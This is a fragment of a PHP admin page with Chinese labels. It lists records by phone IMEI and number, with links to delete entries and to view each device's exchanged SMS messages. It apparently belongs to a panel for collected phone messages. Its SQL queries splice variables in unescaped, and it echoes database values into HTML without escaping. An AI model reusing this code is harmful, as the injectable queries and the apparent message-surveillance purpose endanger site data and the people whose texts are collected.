...
<div class="page-container">
	...
	<div class="mt-20">
		<table class="table table-border table-bordered table-bg table-hover table-sort table-responsive">
			...
			<tbody>
			<?php 
			$a = mysqli_query($GLOBALS['link'],"select * from content where id>0$w order by id desc limit $s,$f");
			$a2 = mysqli_query($GLOBALS['link'],"select count(id) from content where id>0$w order by id desc");
	...
	while($row = mysqli_fetch_array($a)){
			...
			?>
				<tr class="text-c">
					...
					<td><?php echo '<a title="删除" href="javascript:;" onclick="member_del(this,\''.$row['id'].'\')" class="ml-5" style="text-decoration:none">删除</a>&nbsp;&nbsp;
					<a title="查看" href="javascript:;" onclick="member_edit(\'查看\',\'smslist.php?i='.$row['imei'].'&q='.$row['imei2'].'&t='.$row['tel'].'\',\'4\',\'1300\',\'610\')" class="ml-5" style="text-decoration:none"><i class="Hui-iconfont">&#xe6df;</i>查看来往短信</a>';?></td>
...
<?php echo $p<=1 ? '':'<a href="?p='.($p - 1).$c.'"><div class="fy">上一页</div></a>'?>
<div class="fy">当前第<?php echo $p;?>页，共<?php echo $ps;?>页</div>
<?php echo $p>=$ps ? '':'<a href="?p='.($p + 1).$c.'"><div class="fy">下一页</div></a>'?>
	<style>
